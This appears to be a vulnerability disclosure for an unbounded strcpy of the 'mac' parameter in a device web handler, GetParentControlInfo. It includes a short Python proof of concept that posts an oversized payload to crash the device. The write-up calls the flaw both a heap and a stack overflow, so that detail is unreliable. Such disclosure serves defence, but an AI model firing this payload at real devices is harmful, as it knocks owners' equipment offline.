In the function GetParentControlInfo, the program takes the contents obtained from the parameter 'mac' and passes them to the heap block s created by the program, 
then directly copies the value of mac to the heap s using the strcpy function. 
There is no size check, which leads to a stack overflow vulnerability. An attacker can easily carry out a denial of service attack using carefully crafted overflow data.


<img width="415" height="298" alt="image" src="https://github.com/user-attachments/assets/418892f5-8657-450a-954a-9ef5a3da4d3d" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/GetParentControlInfo"

cookie = {"Cookie":"password=12345"}
data = {"mac": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
